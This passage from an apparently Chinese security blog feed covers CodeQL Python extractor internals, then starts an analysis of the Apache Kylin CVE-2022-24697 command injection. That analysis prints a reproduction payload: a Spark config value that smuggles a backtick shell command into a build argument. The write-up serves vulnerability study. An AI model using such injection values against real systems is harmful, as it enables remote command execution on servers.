class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add_use</span>(<span class="params">self, node, var</span>):</span><br><span class="line">    <span class="keyword">assert</span> node <span class="keyword">in</span> <span class="variable language_">self</span>.succ, node</span><br><span class="line">    <span class="variable language_">self</span>.uses[node] = var</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_walk_name</span>(<span class="params">self, node, predecessors, ctx_type = <span class="literal">None</span></span>):</span><br><span class="line">    <span class="comment"># Too many exception edges make analysis slower and adds almost no accuracy</span></span><br><span class="line">    <span class="comment"># Assume that Name may only raise an exception if global in scope and</span></span><br><span class="line">    <span class="comment"># not a store</span></span><br><span class="line">    res = <span class="variable language_">self</span>.add_successor(predecessors, node)</span><br><span class="line">    <span class="keyword">if</span> ctx_type <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        ctx_type = <span class="built_in">type</span>(node.ctx)</span><br><span class="line">        <span class="keyword">assert</span> ctx_type <span class="keyword">not</span> <span class="keyword">in</span> (ast.AugAssign, ast.AugLoad)</span><br><span class="line">    <span class="comment">#Only generate SSA variables for variables local to scope</span></span><br><span class="line">    <span class="keyword">if</span> node.variable.scope == <span class="variable language_">self</span>.scope.ast_scope:</span><br><span class="line">        <span class="keyword">if</span> ctx_type <span class="keyword">in</span> (ast.Store, ast.Param, ast.AugStore):</span><br><span class="line">            <span class="keyword">for</span> flow_node, kind <span class="keyword">in</span> res:</span><br><span class="line">                <span class="variable language_">self</span>.scope.graph.add_definition(flow_node, node.variable)</span><br><span class="line">        <span class="keyword">elif</span> ctx_type <span class="keyword">is</span> ast.Del:</span><br><span class="line">            <span class="keyword">for</span> flow_node, kind <span class="keyword">in</span> res:</span><br><span class="line">                <span class="variable language_">self</span>.scope.graph.add_deletion(flow_node, node.variable)</span><br><span class="line">        <span class="keyword">elif</span> ctx_type <span class="keyword">in</span> (ast.Load, ast.AugLoad):</span><br><span class="line">            <span class="keyword">for</span> flow_node, kind <span class="keyword">in</span> res:</span><br><span class="line">                <span class="variable language_">self</span>.scope.graph.add_use(flow_node, node.variable)</span><br></pre></td></tr></table></figure><p>可以看到，FlowGraph 的接口add_use，参数顾名思义是node 是ASTNode，Var 是Variable</p><p><img src="/images/pasted-907.png" alt="upload successful"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Variable</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&#x27;A variable&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, var_id, scope = <span class="literal">None</span></span>):</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">isinstance</span>(var_id, <span class="built_in">str</span>), <span class="built_in">type</span>(var_id)</span><br><span class="line">        <span class="variable language_">self</span>.<span class="built_in">id</span> = var_id</span><br><span class="line">        <span class="variable language_">self</span>.scope = scope</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Variable(%r, %r)&#x27;</span> % (<span class="variable language_">self</span>.<span class="built_in">id</span>, <span class="variable language_">self</span>.scope)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(other) <span class="keyword">is</span> <span class="keyword">not</span> Variable:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.scope <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> other.scope <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">&quot;Scope not set&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.scope == other.scope <span class="keyword">and</span> <span class="variable language_">self</span>.<span class="built_in">id</span> == other.<span class="built_in">id</span></span><br></pre></td></tr></table></figure><p><img src="/images/pasted-908.png" alt="upload successful"></p><h5 id="FlowScope"><a href="#FlowScope" class="headerlink" title="FlowScope"></a>FlowScope</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">FlowScope</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, depth, ast_scope</span>):</span><br><span class="line">        <span class="variable language_">self</span>.entry = FlowNode(ast_scope)</span><br><span class="line">        <span class="variable language_">self</span>.graph = graph.FlowGraph(<span class="variable language_">self</span>.entry)</span><br><span class="line">        <span class="variable language_">self</span>.exceptional_exit = FlowNode(ast_scope)</span><br><span class="line">        <span class="variable language_">self</span>.graph.add_node(<span class="variable language_">self</span>.exceptional_exit)</span><br><span class="line">        <span class="variable language_">self</span>.graph.annotate_node(<span class="variable language_">self</span>.exceptional_exit, EXCEPTION_EXIT)</span><br><span class="line">        <span class="variable language_">self</span>.depth = depth</span><br><span class="line">        <span class="variable language_">self</span>.exception_stack = BlockStack()</span><br><span class="line">        <span class="variable language_">self</span>.exception_stack.push_block()</span><br><span class="line">        <span class="variable language_">self</span>.breaking_stack = BlockStack()</span><br><span class="line">        <span class="variable language_">self</span>.continuing_stack = BlockStack()</span><br><span class="line">        <span class="variable language_">self</span>.return_stack = BlockStack()</span><br><span class="line">        <span class="variable language_">self</span>.return_stack.push_block()</span><br><span class="line">        <span class="variable language_">self</span>.ast_scope = ast_scope</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_walk_scope</span>(<span class="params">self, scope_node</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Returns: whether this scope raises an exception (or not)&#x27;&#x27;&#x27;</span></span><br><span class="line">    prev_flow_scope = <span class="variable language_">self</span>.scope</span><br><span class="line">    <span class="keyword">if</span> prev_flow_scope <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="variable language_">self</span>.scope = FlowScope(<span class="number">0</span>, scope_node)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="variable language_">self</span>.scope = prev_flow_scope.inner(scope_node)</span><br><span class="line">    predecessors = SingletonNodeSet(<span class="variable language_">self</span>.scope.entry, NORMAL)</span><br><span class="line">    <span class="keyword">for</span> _, _, child_node <span class="keyword">in</span> iter_fields(scope_node):</span><br><span class="line">        predecessors = <span class="variable language_">self</span>._walk(child_node, predecessors)</span><br></pre></td></tr></table></figure><p>predecessors 这中间有个递归调用</p><ul><li>iter_fields 可以理解为遍历ast Node</li><li>_walk 可以理解为根据当前节点类型，遍历</li></ul><p><img src="/images/pasted-905.png" alt="upload successful"></p><p><img src="/images/pasted-906.png" alt="upload successful"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">self</span>._walkers = &#123;</span><br><span class="line">            <span class="built_in">list</span> : <span class="variable language_">self</span>._walk_list,</span><br><span class="line">            <span class="built_in">bool</span> : <span class="variable language_">self</span>.skip,</span><br><span class="line">            <span class="built_in">int</span> : <span class="variable language_">self</span>.skip,</span><br><span class="line">            <span class="built_in">float</span> : <span class="variable language_">self</span>.skip,</span><br><span class="line">            <span class="built_in">bytes</span> : <span class="variable language_">self</span>.skip,</span><br><span class="line">            <span class="built_in">str</span> : <span class="variable language_">self</span>.skip,</span><br><span class="line">            <span class="built_in">complex</span> : <span class="variable language_">self</span>.skip,</span><br><span class="line">            <span class="built_in">type</span>(<span class="literal">None</span>) : <span class="variable language_">self</span>.skip,</span><br></pre></td></tr></table></figure><p>walkers 针对不同的ast 类型，有不同的处理方式，想上面列的，str 之类的，无需放到CFG 中，CFG 主要关注的是方法调用、行参实参的传播，我们重点看这一块的处理。</p><h5 id="LexicalPass"><a href="#LexicalPass" class="headerlink" title="LexicalPass"></a>LexicalPass</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">LexicalPass</span>(<span class="title class_ inherited__">Pass</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">extract</span>(<span class="params">self, ast, comments, writer</span>):</span><br><span class="line">        <span class="string">&#x27;The entry point&#x27;</span></span><br><span class="line">        LexicalModule(ast, comments, writer).extract()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LexicalModule</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&#x27;Object for extracting lexical information for the given module.&#x27;</span></span><br></pre></td></tr></table></figure><p>用于从给定模块中提取词汇信息的对象</p><h5 id="ObjectPass"><a href="#ObjectPass" class="headerlink" title="ObjectPass"></a>ObjectPass</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ObjectPass</span>(<span class="title class_ inherited__">Pass</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Generates relations for objects. This includes information about</span></span><br><span class="line"><span class="string">    builtin objects, including their types and members.</span></span><br><span class="line"><span class="string">    It also generates objects for all literal values present in the Python source.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">extract</span>(<span class="params">self, ast, path, writer</span>):</span><br><span class="line">        <span class="variable language_">self</span>.writer = writer</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="variable language_">self</span>._extract_py(ast)</span><br><span class="line">            <span class="variable language_">self</span>._extract_possible_module_names(path)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            <span class="variable language_">self</span>.writer = <span class="literal">None</span></span><br></pre></td></tr></table></figure><p>生成类信息</p><h4 id="2-13-疑问"><a href="#2-13-疑问" class="headerlink" title="2.13 疑问"></a>2.13 疑问</h4><ul><li>跨文件分析是如何实现的？CST 都是单文件的分析</li></ul><h2 id="3-Trap2DB"><a href="#3-Trap2DB" class="headerlink" title="3. Trap2DB"></a>3. Trap2DB</h2><h3 id="3-1-pre-finalize"><a href="#3-1-pre-finalize" class="headerlink" title="3.1 pre-finalize"></a>3.1 pre-finalize</h3><p><img src="/images/pasted-909.png" alt="upload successful"></p><p><img src="/images/pasted-910.png" alt="upload successful"></p><ol><li>trap 文件读取</li></ol><p>FileSubtask</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public InputStream makeNewStream() throws IOException &#123;</span><br><span class="line">    <span class="keyword">return</span> CompressedFileInputStream.fromFile(this.trapFile);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-911.png" alt="upload successful"></p><ol start="2"><li>ImportTasksProcessor</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">TrapInputStream trapInputStream = new TrapInputStream(subtask.getOriginalInputStream(), subtask);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    TRAPReader trapReader = new TRAPReader(trapInputStream, subtaskName, this.getThreadWriter(), this.ids, this.trapReaderConfig, this.cancelToken);</span><br><span class="line">    trapReader.importTuples((LinkTarget[])subtask.getAdditionalInformation());</span><br><span class="line">    bytesRead += trapReader.getBytesRead();</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-912.png" alt="upload successful"></p><ol start="3"><li>TRAPReader<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">protected void scanTuplesAndLabels(TrapScanner scanner, ScanMode scanMode) throws IOException &#123;</span><br><span class="line">    <span class="built_in">int</span> tryResolveTuplesThreshold = <span class="number">1000</span>;</span><br><span class="line">    ArrayList&lt;Object&gt; fields = new ArrayList();</span><br><span class="line">    String previousLabel = null;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(true) &#123;</span><br><span class="line">        this.cancelToken.checkCancelled();</span><br><span class="line">        TokenKind token = scanner.nextToken();</span><br><span class="line">        String labelToModify = previousLabel;</span><br><span class="line">        previousLabel = null;</span><br><span class="line">        switch (token) &#123;</span><br><span class="line">            <span class="keyword">case</span> LABEL:</span><br><span class="line">                <span class="keyword">if</span> (!scanMode.computeLabels) &#123;</span><br><span class="line">                    skipLabel(scanner);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    String label = scanner.getLabelValue();</span><br><span class="line">                    expectToken(scanner.nextToken(), TRAPReader.TokenKind.EQ, <span class="string">&quot;=&quot;</span>);</span><br><span class="line">                    this.scanLabelValue(scanner, label);</span><br><span class="line">                    previousLabel = label;</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure></li></ol><p><img src="/images/pasted-913.png" alt="upload successful"></p><p>每个Trap 内容都是单独的，需要整合所有的trap 文件</p><h3 id="3-2-Trap-格式"><a href="#3-2-Trap-格式" class="headerlink" title="3.2 Trap 格式"></a>3.2 Trap 格式</h3><h4 id="3-2-1-基础结构"><a href="#3-2-1-基础结构" class="headerlink" title="3.2.1 基础结构"></a>3.2.1 基础结构</h4><h5 id="Tuple-结构"><a href="#Tuple-结构" class="headerlink" title="Tuple 结构"></a>Tuple 结构</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">class</span> <span class="title class_">Tuple</span> &#123;</span><br><span class="line">    private String tableName;</span><br><span class="line">    private Object[] fields;</span><br></pre></td></tr></table></figure><p>顾名思义，python tuple的意思，不过不经相同，以trap 文件内的<code>containerparent(#10007, #10006)</code> 为例</p><p><img src="/images/pasted-915.png" alt="upload successful"></p><p>tuple 表名会最终对应codeql db 中的一个.rel 表</p><h5 id="PreThreadWriter"><a href="#PreThreadWriter" class="headerlink" title="PreThreadWriter"></a>PreThreadWriter</h5><p><img src="/images/pasted-917.png" alt="upload successful"></p><h5 id="RelationEntry"><a href="#RelationEntry" class="headerlink" title="RelationEntry"></a>RelationEntry</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">private <span class="keyword">class</span> <span class="title class_">RelationEntry</span> &#123;</span><br><span class="line">    private final String name;</span><br><span class="line">    private final RelationType <span class="built_in">type</span>;</span><br><span class="line">    private final <span class="type">List</span>&lt;Path&gt; fragmentPaths = new ArrayList();</span><br><span class="line">    private ConcreteRelationWriter relation;</span><br><span class="line">    private ClosableSink sink;</span><br><span class="line">    private <span class="built_in">int</span> writtenTuples = <span class="number">0</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>addTuple 接口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">private void addTuple(long[] <span class="built_in">tuple</span>) &#123;</span><br><span class="line">    this.sink.addTuple(<span class="built_in">tuple</span>);</span><br><span class="line">    this.increaseTupleCount();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="BTreeRelationWriter"><a href="#BTreeRelationWriter" class="headerlink" title="BTreeRelationWriter"></a>BTreeRelationWriter</h5><p>BTree Relation 指的是数据库中的关系型数据存储，它使用了B 树结构作为索引，从而实现对数据的快速查询和访问。</p><h4 id="3-2-2-流程"><a href="#3-2-2-流程" class="headerlink" title="3.2.2 流程"></a>3.2.2 流程</h4><h5 id="Trap-文件解析"><a href="#Trap-文件解析" class="headerlink" title="Trap 文件解析"></a>Trap 文件解析</h5><ul><li>LABEL</li><li>IDENTIFIER</li></ul><p>TRAPReader</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">protected void scanTuplesAndLabels(TrapScanner scanner, ScanMode scanMode) throws IOException &#123;</span><br><span class="line">    <span class="keyword">while</span>(true) &#123;</span><br><span class="line">        this.cancelToken.checkCancelled();</span><br><span class="line">        TokenKind token = scanner.nextToken();</span><br><span class="line">        String labelToModify = previousLabel;</span><br><span class="line">        previousLabel = null;</span><br><span class="line">        switch (token) &#123;</span><br><span class="line">            <span class="keyword">case</span> LABEL:</span><br><span class="line">            <span class="keyword">case</span> IDENTIFIER:</span><br><span class="line">            <span class="keyword">case</span> PUSH:</span><br><span class="line">            <span class="keyword">case</span> POP:</span><br><span class="line">            <span class="keyword">case</span> IF_FRESH:</span><br><span class="line">            <span class="keyword">case</span> END_IF_FRESH:</span><br><span class="line">            <span class="keyword">case</span> IMPLEMENTATION:</span><br><span class="line">            <span class="keyword">case</span> EOF:</span><br></pre></td></tr></table></figure><h5 id="LABEL"><a href="#LABEL" class="headerlink" title="LABEL"></a>LABEL</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#10000 = @&quot;(&#x27;/Users/m0d9/Downloads/langflow-main/scripts/ci/update_starter_projects.py&#x27;, &#x27;utf-8;sourcefile&#x27;)&quot;</span><br></pre></td></tr></table></figure><p>LABEL = #10000<br>Value = @”(‘/Users/m0d9/Downloads/langflow-main/scripts/ci/update_starter_projects.py’, ‘utf-8;sourcefile’)”<br>LABELValue 会根据Value 生成ID</p><p>例如：<br><img src="/images/pasted-916.png" alt="upload successful"></p><h5 id="IDENTIFIER"><a href="#IDENTIFIER" class="headerlink" title="IDENTIFIER"></a>IDENTIFIER</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">files(#10000, &quot;/Users/m0d9/Downloads/langflow-main/scripts/ci/update_starter_projects.py&quot;)</span><br></pre></td></tr></table></figure><p>Identifier 需要指定Label<br>tableName = file</p><p>最终结果会被保存在TaggedTuple 结构中</p><p><img src="/images/pasted-914.png" alt="upload successful"></p><h5 id="Merge"><a href="#Merge" class="headerlink" title="Merge"></a>Merge</h5><p>先写cache/working/xxx.relcheck</p><p>再通过Merge().merge 合并</p><p><img src="/images/pasted-920.png" alt="upload successful"></p><p>那么cache/working/xxx.relcheck 是何时生成的呢？</p><p>答案是在RelationEntry 每一次addTuple 中就会触发，实际上会直接往这个relcheck 文件里面写</p><p><img src="/images/pasted-921.png" alt="upload successful"></p><h5 id="Saver"><a href="#Saver" class="headerlink" title="Saver"></a>Saver</h5><p>Saver addTag/addTuple/flush 都会进行文件写入</p><p>addTag</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="title function_">addTag</span><span class="params">(<span class="type">byte</span> tag)</span> &#123;</span><br><span class="line">    <span class="type">ByteBuffer</span> <span class="variable">newBuffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">1</span>);</span><br><span class="line">    newBuffer.put(tag);</span><br><span class="line">    newBuffer.flip();</span><br><span class="line">    <span class="built_in">this</span>.checksum.update(tag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.channel.write(newBuffer);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException var4) &#123;</span><br><span class="line">        <span class="type">IOException</span> <span class="variable">e</span> <span class="operator">=</span> var4;</span><br><span class="line">        <span class="keyword">throw</span> <span class="built_in">this</span>.makeResourceError(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addTuple</span><span class="params">(<span class="type">long</span>... longTuple)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.updateIntTuple(longTuple);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.ibuf.remaining() &lt; <span class="built_in">this</span>.intTuple.length) &#123;</span><br><span class="line">        <span class="built_in">this</span>.flush();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.ibuf.put(<span class="built_in">this</span>.intTuple);</span><br><span class="line">    <span class="built_in">this</span>.noTuples = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-919.png" alt="upload successful"></p><p>至于文件格式，为codeql 独有的</p><h2 id="3-blib2to3-VS-AST"><a href="#3-blib2to3-VS-AST" class="headerlink" title="3. blib2to3 VS AST"></a>3. blib2to3 VS AST</h2><h2 id="5-其他"><a href="#5-其他" class="headerlink" title="5. 其他"></a>5. 其他</h2><p>可能有安全风险</p><p><img src="/images/pasted-900.png" alt="upload successful"></p><h2 id="6-参考"><a href="#6-参考" class="headerlink" title="6. 参考"></a>6. 参考</h2><ol><li><a href="https://github.com/github/codeql/blob/main/python/extractor/README.md">https://github.com/github/codeql/blob/main/python/extractor/README.md</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近定位python codeql 的一个cve 复现，发现涉及到extractor 的逻辑，正好之前也有跟踪过java 的经验，应该大差不差，记录下。&lt;/p&gt;
&lt;h2 id=&quot;1-架构&quot;&gt;&lt;a href=&quot;#1-架构&quot; class=&quot;headerlink&quot; title=&quot;1. 架构&quot;&gt;&lt;/a&gt;1. 架构&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/images/pasted-890.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/github/codeql/blob/main/python/extractor/README.md#2-The-actual-Python-extractor&quot;&gt;https://github.com/github/codeql/blob/main/python/extractor/README.md#2-The-actual-Python-extractor&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CodeQL" scheme="http://m0d9.me/categories/CodeQL/"/>
    
    
    <category term="CodeQL" scheme="http://m0d9.me/tags/CodeQL/"/>
    
    <category term="Extractor" scheme="http://m0d9.me/tags/Extractor/"/>
    
  </entry>
  
  <entry>
    <title>Apache Kylin CVE-2022-24697/CVE-2022-43396 漏洞分析与CodeQL 验证</title>
    <link href="http://m0d9.me/2024/06/17/Apache-Kylin-CVE-2022-24697--%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8ECodeQL-%E9%AA%8C%E8%AF%81/"/>
    <id>http://m0d9.me/2024/06/17/Apache-Kylin-CVE-2022-24697--%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8ECodeQL-%E9%AA%8C%E8%AF%81/</id>
    <published>2024-06-17T13:09:00.000Z</published>
    <updated>2025-06-20T09:48:30.874Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>在官方漏洞报告中，说CVE-2022-43396是CVE-2022-24697的绕过。实际情况却是：两个漏洞均是发送在 Kylin 的 cube build 功能中，但CVE-2022-24697是参数可控；CVE-2022-43396是命令可控。</p></blockquote><p>下文以CVE-2022-24697 为例，主要目的是跟踪下数据流，看看能否用CodeQL 复现。</p><h2 id="1-漏洞概况"><a href="#1-漏洞概况" class="headerlink" title="1. 漏洞概况"></a>1. 漏洞概况</h2><blockquote><p>影响版本：<br>Kylin 2.x &amp; Kylin 3.x &amp; 4.x should upgrade to 4.0.2</p></blockquote><h2 id="2-漏洞分析"><a href="#2-漏洞分析" class="headerlink" title="2. 漏洞分析"></a>2. 漏洞分析</h2><h3 id="2-1-漏洞环境搭建"><a href="#2-1-漏洞环境搭建" class="headerlink" title="2.1 漏洞环境搭建"></a>2.1 漏洞环境搭建</h3><p>同前文，不赘述</p><span id="more"></span><p>参考[1] 中的步骤，在Cube Designer Configuration Overwrites 中配置如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kylin.engine.spark-conf.spark.driver.memory</span><br><span class="line">512M&#x27; `touch /tmp/hacked` --name &#x27;a</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-956.png" alt="upload successful"></p><p><img src="/images/pasted-957.png" alt="upload successful"></p><h3 id="2-2-漏洞原理分析"><a href="#2-2-漏洞原理分析" class="headerlink" title="2.2 漏洞原理分析"></a>2.2 漏洞原理分析</h3><p>整个逻辑涉及到几个线程</p><ol><li>web api CubeController#updateCubeDesc 更新CubeDesc 配置信息，在其config.overrides，config是个KylinConfigExt 类型；随后异步更新CubeInstance</li><li>web api CubeController#rebuild 生成一条rebuild Job，写入ExecutableManager 的队列中</li><li>DefaultScheduler 循环线程，始终从ExecutableManager 中获取job 信息，根据job 中的cubename从CubeManager 获取Cube 信息，获取步骤1 中的config.overrides 进行命令拼接，导致命令执行</li></ol><h4 id="2-2-1-CubeController-updateCubeDesc"><a href="#2-2-1-CubeController-updateCubeDesc" class="headerlink" title="2.2.1 CubeController#updateCubeDesc"></a>2.2.1 CubeController#updateCubeDesc</h4><p>CubeController#updateCubeDesc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;&quot;, method = &#123; RequestMethod.PUT &#125;, produces = &#123; &quot;application/json&quot; &#125;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> CubeRequest <span class="title function_">updateCubeDesc</span><span class="params">(<span class="meta">@RequestBody</span> CubeRequest cubeRequest)</span> <span class="keyword">throws</span> JsonProcessingException &#123;</span><br><span class="line">    <span class="type">CubeDesc</span> <span class="variable">desc</span> <span class="operator">=</span> deserializeCubeDesc(cubeRequest);</span><br><span class="line">        <span class="type">CubeInstance</span> <span class="variable">cube</span> <span class="operator">=</span> cubeService.getCubeManager().getCube(cubeRequest.getCubeName());</span><br><span class="line">        desc = cubeService.updateCubeAndDesc(cube, desc, projectName, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>CubeService.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> 